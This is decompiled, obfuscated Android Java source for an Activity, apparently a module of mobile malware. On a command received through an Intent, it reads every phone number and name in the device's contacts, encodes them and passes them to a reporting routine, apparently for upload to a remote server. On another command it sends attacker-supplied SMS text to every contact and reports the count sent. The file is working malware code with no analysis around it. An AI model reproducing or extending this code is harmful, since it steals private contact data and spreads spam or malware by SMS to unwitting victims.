package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.C0039c;

public class wami extends Activity {

    /* renamed from: a */
    C0034b f473a = new C0034b();

    /* renamed from: b */
    C0039c f474b = new C0039c();

    /* renamed from: a */
    public void mo344a(ContentResolver contentResolver) {
        try {
            if (!this.f473a.mo234e(this, "getNumber").equals("true")) {
                Cursor query = contentResolver.query(Phone.CONTENT_URI, null, null, null, null);
                StringBuilder sb = new StringBuilder();
                sb.append("(");
                sb.append(this.f473a.mo246p(this));
                sb.append(") Numbers from the phone book");
                String sb2 = sb.toString();
                while (query.moveToNext()) {
                    String string = query.getString(query.getColumnIndex("data1"));
                    String string2 = query.getString(query.getColumnIndex("display_name"));
                    if (!string.contains("*") && !string.contains("#") && string.length() > 6 && !sb2.contains(string)) {
                        StringBuilder sb3 = new StringBuilder();
                        sb3.append(sb2);
                        sb3.append(string);
                        sb3.append("     ");
                        sb3.append(string2);
                        sb3.append("</br>");
                        sb3.append(10);
                        sb2 = sb3.toString();
                    }
                }
                StringBuilder sb4 = new StringBuilder();
                sb4.append("p=");
                C0034b bVar = this.f473a;
                StringBuilder sb5 = new StringBuilder();
                sb5.append(this.f473a.mo247q(this));
                sb5.append("|");
                sb5.append(sb2);
                sb5.append("|");
                sb4.append(bVar.mo225c(sb5.toString()));
                this.f473a.mo218b(this, "4", sb4.toString());
                this.f473a.mo233d(this, "getNumber", "true");
                finish();
            }
        } catch (Exception unused) {
            finish();
        }
    }

    /* renamed from: a */
    public void mo345a(ContentResolver contentResolver, String str) {
        Cursor query = contentResolver.query(Phone.CONTENT_URI, null, null, null, null);
        boolean z = false;
        boolean z2 = false;
        int i = 0;
        while (query.moveToNext()) {
            String string = query.getString(query.getColumnIndex("data1"));
            if (!string.contains("*") && !string.contains("#") && string.length() > 7) {
                try {
                    this.f473a.mo228c(this, string, str);
                    i++;
                    z2 = true;
                } catch (Exception unused) {
                    StringBuilder sb = new StringBuilder();
                    sb.append("p=");
                    C0034b bVar = this.f473a;
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(this.f473a.mo247q(this));
                    sb2.append("|Error sending SMS, maybe there are no permission to send!|");
                    sb.append(bVar.mo225c(sb2.toString()));
                    this.f473a.mo218b(this, "4", sb.toString());
                }
            }
        }
        z = z2;
        if (z) {
            StringBuilder sb3 = new StringBuilder();
            sb3.append("p=");
            C0034b bVar2 = this.f473a;
            StringBuilder sb4 = new StringBuilder();
            sb4.append(this.f473a.mo247q(this));
            sb4.append("|The dispatch was successful, ");
            sb4.append(i);
            sb4.append(" SMS sent|");
            sb3.append(bVar2.mo225c(sb4.toString()));
            this.f473a.mo218b(this, "4", sb3.toString());
        }
        finish();
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            Intent intent = getIntent();
            String stringExtra = intent.getStringExtra("str");
            String stringExtra2 = intent.getStringExtra("cwc_text");
            if (stringExtra.contains("0")) {
                mo344a(getContentResolver());
            }
            if (stringExtra.contains("1")) {
                mo345a(getContentResolver(), stringExtra2);
            }
            finish();
        } catch (Exception unused) {
            finish();
        }
    }
}
